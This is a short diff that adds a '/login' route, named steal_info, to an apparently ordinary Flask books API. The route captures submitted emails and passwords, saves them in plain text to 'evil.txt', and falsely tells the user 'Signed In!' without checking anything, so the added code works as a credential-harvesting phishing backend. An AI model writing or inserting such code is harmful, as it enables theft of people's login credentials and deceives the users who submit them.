@@ -43,6 +43,26 @@ def all_books():
     response_object['books'] = BOOKS
   return jsonify(response_object)
 
+@app.route('/login', methods=['POST'])
+def steal_info():
+  response_object = {'status': 'success'}
+  if request.method == "POST":
+    post_data = request.get_json()
+
+    # Get the email and password from the request
+    email = post_data.get('email')
+    password = post_data.get("password")
+
+    # Open the file to write the email and password
+    file = open("evil.txt", "w")
+
+    evil_data = email + " : " + password
+    file.write(evil_data)
+
+    file.close()
+    response_object['message'] = "Signed In!"
+  
+  return jsonify(response_object)
 
 if __name__ == '__main__':
   app.run()
